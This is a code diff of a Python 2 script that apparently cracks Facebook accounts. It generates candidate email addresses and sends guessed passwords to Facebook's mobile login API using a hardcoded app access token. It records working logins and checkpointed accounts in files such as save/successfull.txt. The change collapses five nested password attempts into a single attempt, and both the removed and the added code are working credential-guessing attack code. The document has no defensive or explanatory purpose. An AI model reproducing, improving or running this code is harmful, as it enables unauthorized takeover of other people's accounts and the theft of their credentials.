@@ -196,89 +196,20 @@ def cemail():
             pass
         try:
 			pass1 = anggaxd1
-			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-			q = json.load(data)
-			if 'access_token' in q:
-				print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + user + c + ' ◐ ' + pass1
-				okb = open('junee/crack.txt', 'a')
-				okb.write(k + user + c + ' ◐ ' + pass1+'\n')
-				okb.close()
-				oks.append(k + user + c + pass1)
-			else:
-				if 'www.facebook.com' in q['error_msg']:
-					print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + user + c + ' ◐ ' + pass1
-					cps = open('junee/crack.txt', 'a')
-					cps.write(k + user + c + ' ◐ ' + pass1+'\n')
-					cps.close()
-					cpb.append(k + user + c + pass1)
-				else:
-					pass2 = anggaxd2
-					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-					q = json.load(data)
-					if 'access_token' in q:
-						print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass2
-						okb = open('junee/crack.txt', 'a')
-						okb.write(k + user + c + ' ◐ ' + pass2+'\n')
-						okb.close()
-						oks.append(k + user + c + pass2)
-					else:
-						if 'www.facebook.com' in q['error_msg']:
-							print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass2
-							cps = open('junee/crack.txt', 'a')
-							cps.write(k + user + c + ' ◐ ' + pass2+'\n')
-							cps.close()
-							cpb.append(k + user + c + pass2)
-						else:
-							pass3 = anggaxd3
-							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-							q = json.load(data)
-							if 'access_token' in q:
-								print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass3
-								okb = open('junee/crack.txt', 'a')
-								okb.write(k + user + c + ' ◐ ' + pass3+'\n')
-								okb.close()
-								oks.append(k + user + c + pass3)
-							else:
-								if 'www.facebook.com' in q['error_msg']:
-									print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass3
-									cps = open('junee/crack.txt', 'a')
-									cps.write(k + user + c + ' ◐ ' + pass3+'\n')
-									cps.close()
-									cpb.append(k + user + c + pass3)
-								else:
-									pass4 = anggaxd4
-									data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-									q = json.load(data)
-									if 'access_token' in q:
-										print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass4
-										okb = open('junee/crack.txt', 'a')
-										okb.write(k + user + c + ' ◐ ' +pass4+'\n')
-										okb.close()
-										oks.append(k + user + c + pass4)
-									else:
-										if 'www.facebook.com' in q['error_msg']:
-											print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass4
-											cps = open('junee/crack.txt', 'a')
-											cps.write(k + user + c + ' ◐ ' + pass4+'\n')
-											cps.close()
-											cpb.append(k + user + c + pass4)
-										else:
-											pass5 = anggaxd5
-											data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-											q = json.load(data)
-											if 'access_token' in q:
-												print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass5
-												okb = open('junee/crack.txt', 'a')
-												okb.write(k + user + c + ' ◐ ' + pass5+'\n')
-												okb.close()
-												oks.append(k + user + c + pass5)
-											else:
-												if 'www.facebook.com' in q['error_msg']:
-													print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass5
-													cps = open('junee/crack.txt', 'a')
-													cps.write(k + user + c + ' ◐ ' + pass5+'\n')
-													cps.close()
-													cpb.append(k + user + c + pass5)
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + user + c + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m]  ' + k + user + c + ' ◐ ' + pass1
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + user + c + ' ◐ ' + pass1 + '\n')
+                okb.close()
+                oks.append(k + user + c + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m]  ' + k + user + c + ' ◐ ' + pass1
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + user + c + ' ◐ ' + pass1 + '\n')
+                cps.close()
+                cpb.append(k + user + c + pass1)
         except:
             pass
             
